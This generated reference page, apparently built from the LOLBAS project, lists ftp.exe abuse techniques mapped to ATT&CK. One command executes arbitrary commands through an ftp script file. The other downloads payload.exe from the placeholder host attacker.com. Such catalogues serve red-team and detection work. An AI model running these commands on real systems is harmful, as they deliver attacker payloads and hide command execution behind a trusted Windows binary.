---
parsed_by: focuslocust
source: commands
type: generated
---
# Ftp Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Ftp.exe

Tool page: [Ftp.exe](../../tools/windows/ftp.exe.md)

### Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand

```text
echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
```

Description:

Executes the commands you put inside the text file.

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ftp.yml` |
| Evidence | Command preserved from source parser. |

### Spawn new process using ftp.exe. Ftp.exe downloads the binary.

```text
cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
```

Description:

Download

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ftp.yml` |
| Evidence | Command preserved from source parser. |
